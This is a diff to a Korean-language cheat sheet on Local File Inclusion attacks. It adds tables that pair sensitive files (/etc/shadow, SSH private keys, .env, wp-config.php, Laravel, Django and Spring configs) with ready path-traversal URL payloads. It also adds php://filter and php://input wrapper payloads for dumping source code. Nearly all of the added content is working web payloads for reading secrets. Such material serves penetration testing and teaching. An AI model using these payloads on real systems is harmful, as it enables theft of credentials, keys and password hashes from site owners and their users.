@@ -26,6 +26,23 @@
 | `web.xml`                                   | Java Web App 설정 파일 (Servlet 경로 등 포함)                       |
 | `application.yml`, `application.properties` | Spring Boot 설정 파일 (DB, Port, 보안 정보 포함 가능)                  |
 
+| 📄 파일 경로             | 🔍 설명                      | 🔐 LFI URL 예시                                                  |
+| -------------------- | -------------------------- | -------------------------------------------------------------- |
+| `/etc/passwd`        | 시스템 사용자 계정 목록              | `?page=../../../../etc/passwd`                                 |
+| `/etc/shadow`        | 비밀번호 해시 저장 파일 (권한 제한됨)     | `?page=../../../../etc/shadow`                                 |
+| `/proc/self/environ` | 웹서버의 환경변수 (경로, 쿠키 등 확인 가능) | `?page=/proc/self/environ`                                     |
+| `.htaccess`          | Apache 접근 제어 설정            | `?page=../../../../var/www/html/.htaccess`                     |
+| `.htpasswd`          | Apache 인증 사용자/비밀번호         | `?page=../../../../var/www/html/.htpasswd`                     |
+| `.bash_history`      | 명령어 히스토리 (민감 정보 노출 가능)     | `?page=../../../../home/user/.bash_history`                    |
+| `.ssh/id_rsa`        | SSH 개인 키 (심각한 보안 위협)       | `?page=../../../../home/user/.ssh/id_rsa`                      |
+| `.env`               | 환경 변수 (DB, API Key 포함)     | `?page=../../../../var/www/html/.env`                          |
+| `.git/config`        | Git 저장소 정보 (리모트 주소 등)      | `?page=../../../../var/www/html/.git/config`                   |
+| `.svn/entries`       | SVN 정보                     | `?page=../../../../var/www/html/.svn/entries`                  |
+| `composer.json`      | PHP 의존성 정보                 | `?page=../../../../var/www/html/composer.json`                 |
+| `web.xml`            | Java 웹앱 설정                 | `?page=../../../../WEB-INF/web.xml`                            |
+| `php://filter/...`   | PHP 내부 필터를 이용한 소스코드 인코딩 보기 | `?page=php://filter/convert.base64-encode/resource=config.php` |
+
+
 ---
 
 ### ✅ **2. 프레임워크/엔진 별 LFI 대상 파일 예시**
@@ -66,6 +83,63 @@
 
 ---
 
+### 📘 Laravel
+
+| 📄 파일 경로                   | 🔍 설명                      | 🔐 LFI URL 예시                                             |
+| -------------------------- | -------------------------- | --------------------------------------------------------- |
+| `.env`                     | DB 정보, APP\_KEY, SMTP 정보 등 | `?page=../../../../var/www/html/.env`                     |
+| `storage/logs/laravel.log` | 에러 로그 파일 (내부 경로 유출 가능)     | `?page=../../../../var/www/html/storage/logs/laravel.log` |
+
+
+### 📘 WordPress
+
+| 📄 파일 경로        | 🔍 설명             | 🔐 LFI URL 예시                                  |
+| --------------- | ----------------- | ---------------------------------------------- |
+| `wp-config.php` | DB 접속 정보, 인증 키 포함 | `?page=../../../../var/www/html/wp-config.php` |
+| `.htaccess`     | 리다이렉션, 보안 설정 등 포함 | `?page=../../../../var/www/html/.htaccess`     |
+
+> 참고: PHP에서는 소스코드가 실행되어 내용을 볼 수 없지만, `php://filter` 사용 시 Base64로 출력 가능
+
+```
+?page=php://filter/convert.base64-encode/resource=wp-config.php
+```
+
+
+### 📗 Spring Boot / Java
+
+| 📄 파일 경로                 | 🔍 설명                     | 🔐 LFI URL 예시                              |
+| ------------------------ | ------------------------- | ------------------------------------------ |
+| `application.properties` | DB, 포트, 로깅 설정 등           | `?page=../../../../application.properties` |
+| `application.yml`        | YML 포맷 설정 파일 (더 많은 설정 포함) | `?page=../../../../application.yml`        |
+| `WEB-INF/web.xml`        | 서블릿 설정, 보안 설정 포함          | `?page=../../../../WEB-INF/web.xml`        |
+
+
+### 📕 CodeIgniter
+
+| 📄 파일 경로                          | 🔍 설명                 | 🔐 LFI URL 예시                                       |
+| --------------------------------- | --------------------- | --------------------------------------------------- |
+| `application/config/config.php`   | 앱 기본 설정 (base\_url 등) | `?page=../../../../application/config/config.php`   |
+| `application/config/database.php` | DB 접속 정보              | `?page=../../../../application/config/database.php` |
+
+
+### 📙 Django / Python
+
+| 📄 파일 경로      | 🔍 설명                         | 🔐 LFI URL 예시                           |
+| ------------- | ----------------------------- | --------------------------------------- |
+| `settings.py` | SECRET\_KEY, DB, SMTP 정보 등 포함 | `?page=../../../../project/settings.py` |
+
+
+### 📗 Node.js
+
+| 📄 파일 경로       | 🔍 설명                         | 🔐 LFI URL 예시                    |
+| -------------- | ----------------------------- | -------------------------------- |
+| `.env`         | 환경 변수 (DB, API 키 등)           | `?page=../../../../.env`         |
+| `config.js`    | 설정 파일 (자체 구성에 따라 민감 정보 포함 가능) | `?page=../../../../config.js`    |
+| `package.json` | 프로젝트 정보 및 스크립트                | `?page=../../../../package.json` |
+
+
+---
+
 ### ✅ **3. 기타 유용한 LFI 경로들**
 
 | 경로                            | 설명              |
@@ -87,3 +161,10 @@ http://example.com/index.php?page=../../../../etc/passwd
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
 http://example.com/index.php?page=/proc/self/environ
 ```
+
+| 목적                  | LFI 예시                                                         |
+| ------------------- | -------------------------------------------------------------- |
+| PHP 소스코드 Base64 인코딩 | `?page=php://filter/convert.base64-encode/resource=config.php` |
+| 입력 스트림              | `?page=php://input`                                            |
+| 메모리 스트림             | `?page=php://memory`                                           |
+| 임시 파일 스트림           | `?page=php://temp`                                             |
